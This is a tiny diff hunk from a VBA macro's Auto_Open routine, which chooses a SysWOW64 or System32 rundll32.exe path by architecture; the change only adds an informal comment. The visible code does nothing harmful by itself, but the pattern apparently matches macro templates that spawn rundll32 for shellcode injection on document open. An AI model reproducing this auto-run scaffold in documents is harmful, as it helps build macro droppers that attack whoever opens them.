@@ -232,6 +232,7 @@ Sub Auto_Open()
     If Len(Environ("ProgramW6432")) > 0 Then
         sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
     Else
+        ' this might be causing issues idk idk
         sProc = Environ("windir") & "\\System32\\rundll32.exe"
     End If
 
